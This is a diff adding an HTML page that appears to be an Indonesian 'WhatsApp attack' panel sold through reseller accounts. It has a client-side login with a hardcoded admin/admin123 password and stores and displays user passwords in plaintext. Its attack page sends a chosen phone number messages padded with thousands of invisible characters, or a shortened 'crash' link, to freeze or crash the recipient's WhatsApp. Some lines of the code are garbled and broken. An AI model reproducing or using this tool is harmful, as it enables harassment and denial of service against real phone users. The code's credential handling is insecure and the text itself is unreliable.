@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>RevvFal - WhatsApp Tools</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&display=swap');
+  <style>
+    :root {
+      --primary: #ff00ff;
+      --secondary: #00ffff;
+      --bg: #0a0a1f;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      background: var(--bg) url('https://i.ibb.co/0jYkZ3K/anime-bg.jpg') center/cover no-repeat fixed;
+      font-family: 'Orbitron', sans-serif;
+      color: #fff;
+      min-height: 100vh;
+    }
+    .container { padding: 20px; max-width: 500px; margin: 0 auto; padding-bottom: 100px; }
+    .login-page, .main-app { display: none; }
+    .login-page.active, .main-app.active { display: block; animation: fade 0.8s; }
+    @keyframes fade { from {opacity:0; transform:scale(0.9)} to {opacity:1; transform:scale(1)} }
+
+    .card {
+      background: rgba(20,10,50,0.8);
+      padding: 30px;
+      border-radius: 20px;
+      border: 2px solid var(--primary);
+      box-shadow: 0 0 30px rgba(255,0,255,0.4);
+      backdrop-filter: blur(10px);
+      margin: 20px 0;
+    }
+    h1 {
+      text-align: center;
+      background: linear-gradient(90deg, var(--secondary), var(--primary));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      font-size: 32px;
+      margin-bottom: 30px;
+      text-shadow: 0 0 20px var(--secondary);
+    }
+    input, select {
+      width: 100%;
+      padding: 16px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 12px;
+      background: rgba(60,40,100,0.7);
+      color: white;
+      font-size: 16px;
+    }
+    .btn {
+      width: 100%;
+      padding: 18px;
+      border: none;
+      border-radius: 50px;
+      font-weight: bold;
+      font-size: 18px;
+      background: linear-gradient(45deg, var(--primary), var(--secondary));
+      color: black;
+      cursor: pointer;
+      margin: 15px 0;
+      box-shadow: 0 0 20px rgba(255,0,255,0.6);
+    }
+    .btn:active { transform: scale(0.95); }
+
+    .user-list {
+      max-height: 400px;
+      overflow-y: auto;
+      margin-top: 20px;
+    }
+    .user-item {
+      background: rgba(50,30,90,0.6);
+      padding: 15px;
+      border-radius: 12px;
+      margin: 10px 0;
+      border-left: 4px solid var(--primary);
+    }
+    .expired { opacity: 0.5; text-decoration: line-through; }
+    .role-admin { color: #ff0066; }
+    .role-reseller { color: #00ffaa; }
+    .role-partner { color: #ffaa00; }
+    .role-member { color: #aaa; }
+
+    .logout-btn {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: red;
+      color: white;
+      padding: 10px 15px;
+      border-radius: 50px;
+      font-size: 12px;
+      z-index: 999;
+    }
+  </style>
+</head>
+<body>
+
+<!-- LOGIN PAGE -->
+<div id="loginPage" class="login-page active">
+  <div class="container" style="padding-top:80px;">
+    <h1>RevvFal</h1>
+    <div class="card">
+      <h2 style="text-align:center; color:#00ffff; margin-bottom:20px;">LOGIN PANEL</h2>
+      <input type="text" id="loginUser" placeholder="Username" />
+      <input type="password" id="loginPass" placeholder="Password" />
+      <button class="btn" onclick="login()">LOGIN</button>
+      <p style="text-align:center; margin-top:20px; font-size:14px;">
+        Default Admin:<br><b>admin</b> / <b>admin123</b>
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- MAIN APP -->
+<div id="mainApp" class="main-app">
+  <button class="logout-btn" onclick="logout()">LOGOUT</button>
+  
+  <div class="container">
+    <h1>RevvFal Panel</h1>
+    
+    <!-- Add User Form -->
+    <div class="card">
+      <h2>Add New User</h2>
+      <input type="text" id="newUsername" placeholder="Username" />
+      <input type="password" id="newPassword" placeholder="Password" />
+      <select id="newRole">
+        <option value="member">Member</option>
+        <option value="reseller">Reseller</option>
+        <option value="admin">Admin</option>
+        <option value="partner">Partner</option>
+      </select>
+      <input type="number" id="newDays" placeholder="Expiry Days (1-365)" min="1" max="365" />
+      <button class="btn" onclick="createUser()">CREATE USER</button>
+    </div>
+
+    <!-- User List -->
+    <div class="card">
+      <h2>User List</h2>
+      <div id="userList" class="user-list"></div>
+    </div>
+
+    <!-- WhatsApp Attack Button -->
+    <div class="card" style="text-align:center; margin-top:30px;">
+      <button class="btn" onclick="openPage('attack')">OPEN WHATSAPP ATTACK</button>
+    </div>
+  </div>
+</div>
+
+<!-- WhatsApp Attack Page (sama seperti sebelumnya, tapi dengan login) -->
+<div id="attack" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); padding:20px;">
+  <button style="position:absolute; top:20px; left:20px; background:#333; color:white; padding:10px 20px; border-radius:50px;" onclick="backToPanel()">BACK</button>
+  <h1 style="color:#00ffff; text-align:center; margin:60px 0 30px;">WhatsApp Attack</h1>
+  <input type="text" id="targetNumber" placeholder="Target Number (628xxx)" style="margin-bottom:15px;" />
+  <input type="text" id="bugTypeDisplay" placeholder="Select Bug Type" readonly onclick="openBugModal()" />
+  <button class="btn" onclick="sendBug()">SEND BUG</button>
+</div>
+
+<!-- Bug Modal -->
+<div id="bugModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); justify-content:center; align-items:center;">
+  <div style="background:rgba(30,20,60,0.95); padding:30px; border-radius:20px; border:2px solid #ff00ff; width:90%; max-width:400px;">
+    <h2 style="color:#00ffff; text-align:center;">Pilih Bug</h2>
+    <div style="background:linear-gradient(45deg,#6e00ff,#00ffff); padding:18px; margin:15px 0; border-radius:12px; cursor:pointer;" onclick="pilihBug('DELAY INVISIBLE','invisible')">DELAY INVISIBLE ANDROID/IOS</div>
+    <div style="background:linear-gradient(45deg,#ff0066,#00ffaa); padding:18px; margin:15px 0; border-radius:12px; cursor:pointer;" onclick="pilihBug('BLANK DELAY','blank')">BLANK DELAY VISIBLE</div>
+    <div style="background:linear-gradient(45deg,#ff00aa,#ffaa00); padding:18px; margin:15px 0; border-radius:12px; cursor:pointer;" onclick="pilihBug('CRASH UI','crash')">CRASH UI ANDROID</div>
+    <button class="btn" onclick="document.getElementById('bugModal').style.display='none'">TUTUP</button>
+  </div>
+</div>
+
+<script>
+  // Default admin account
+  if(!localStorage.getItem('users')) {
+    const defaultUsers = [
+      {user:"admin", pass:"admin123", role:"admin", expiry: new Date('2050-12-31').getTime()}
+    ];
+    localStorage.setItem('users', JSON.stringify(defaultUsers));
+  }
+
+  function login() {
+    const u = document.getElementById('loginUser').value.trim();
+    const p = document.getElementById('loginPass').value;
+    const users = JSON.parse(localStorage.getItem('users') || '[]');
+
+    const found = users.find(x => x.user === u && x.pass === p && x.expiry > Date.now());
+    if(found) {
+      localStorage.setItem('loggedIn', 'true');
+      localStorage.setItem('currentUser', u);
+      localStorage.setItem('currentRole', found.role);
+      document.getElementById('loginPage').classList.remove('active');
+      document.getElementById('mainApp').classList.add('active');
+      loadUserList();
+    } else {
+      alert("Username atau password salah / akun expired!");
+    }
+  }
+
+  function logout() {
+    localStorage.removeItem('loggedIn');
+    localStorage.removeItem('currentUser');
+    document.getElementById('mainApp').classList.remove('active');
+    document.getElementById('loginPage').classList.add('active');
+  }
+
+  // Auto login kalau udah pernah
+  if(localStorage.getItem('loggedIn') === 'true') {
+    document.getElementById('loginPage').classList.remove('active');
+    document.getElementById('mainApp').classList.add('active');
+    loadUserList();
+  }
+
+  function createUser() {
+    const username = document.getElementById('newUsername').value.trim();
+    const password = document.getElementById('newPassword').value;
+    const role = document.getElementById('newRole').value;
+    const days = parseInt(document.getElementById('newDays').value);
+
+    if(!username || !password || !days || days<1 || days>365) {
+      alert("Isi semua field dengan benar!");
+      return;
+    }
+
+    const users = JSON.parse(localStorage.getItem('users') || '[]');
+    if(users.find(x => x.user === username)) {
+      alert("Username sudah ada!");
+      return;
+    }
+
+    const expiryDate = new Date();
+    expiryDate.setDate(expiryDate.getDate() + days);
+
+    users.push({
+      user: username,
+      pass: password,
+      role: role,
+      expiry: expiryDate.getTime(),
+      created: new Date().toLocaleDateString('id-ID')
+    });
+
+    localStorage.setItem('users', JSON.stringify(users));
+    alert(`User \( {username} berhasil dibuat!\nExpired: \){expiryDate.toLocaleDateString('id-ID')}`);
+    loadUserList();
+    // Kosongkan form
+    document.getElementById('newUsername').value = '';
+    document.getElementById('newPassword').value = '';
+    document.getElementById('newDays').value = '';
+  }
+
+  function loadUserList() {
+    const list = document.getElementById('userList');
+    const users = JSON.parse(localStorage.getItem('users') || '[]');
+    list.innerHTML = '';
+
+    users.forEach(u => {
+      const expDate = new Date(u.expiry);
+      const isExpired = u.expiry < Date.now();
+      const roleColor = u.role === 'admin' ? 'role-admin' : u.role === 'reseller' ? 'role-reseller' : u.role === 'partner' ? 'role-partner' : 'role-member';
+
+      const div = document.createElement('div');
+      div.className = `user-item ${isExpired ? 'expired' : ''}`;
+      div.innerHTML = `
+        <b>\( {u.user}</b> <span class=" \){roleColor}">[${u.role.toUpperCase()}]</span><br>
+        Password: ${u.pass}<br>
+        Expired: ${expDate.toLocaleDateString('id-ID')} 
+        ${isExpired ? '<span style="color:red;">(EXPIRED)</span>' : '<span style="color:#00ff00;">(ACTIVE)</span>'}
+      `;
+      list.appendChild(div);
+    });
+  }
+
+  // WhatsApp Attack Functions (sama seperti sebelumnya)
+  let selectedBug = "";
+  function openPage(id) { document.getElementById(id).style.display = 'block'; }
+  function backToPanel() { document.getElementById('attack').style.display = 'none'; }
+  function openBugModal() { document.getElementById('bugModal').style.display = 'flex'; }
+  function pilihBug(name, type) {
+    selectedBug = type;
+    document.getElementById('bugTypeDisplay').value = name;
+    document.getElementById('bugModal').style.display = 'none';
+  }
+  function sendBug() {
+    let no = document.getElementById('targetNumber').value.trim();
+    if(!no || !selectedBug) { alert("Pilih bug dulu!"); return; }
+    no = no.replace(/^0/,'62').replace(/^\+62/,'62');
+    if(!no.startsWith('62')) no = '62' + no.replace(/[^0-9]/g,'');
+
+    let pesan = "";
+    if(selectedBug==='invisible') pesan') pesan = "‏‏‎ ‎".repeat(5000)+"RevvFal Invisible";
+    if(selectedBug==='blank') pesan = "‎".repeat(9999)+"Blank Delay";
+    if(selectedBug==='crash') pesan = "https://bit.ly/crashwa2025";
+
+    const url = `whatsapp://send/?phone=\( {no}&text= \){encodeURIComponent(pesan)}&app_absent=0`;
+    window.location.href = url;
+  }
+</script>
+</body>
+  </html>
